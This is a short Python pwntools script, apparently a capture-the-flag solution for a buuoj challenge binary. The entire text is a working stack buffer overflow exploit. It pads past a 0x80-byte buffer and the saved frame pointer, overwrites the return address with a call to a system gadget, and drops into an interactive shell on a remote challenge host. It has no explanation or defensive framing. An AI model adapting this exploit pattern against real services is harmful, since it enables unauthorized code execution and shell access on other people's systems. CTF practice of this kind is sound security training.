#!  /usr/bin/env python

from pwn import *

sh = process('./pwn')
sh = remote("node3.buuoj.cn", 28746)
context.log_level = 'debug'

call_system = 0x00400596
ret = 0x0000400431
sh.recv()
payload = 'a' * 0x80 + 'b' * 0x8 + p64(call_system)
sh.sendline(payload)

sh.interactive()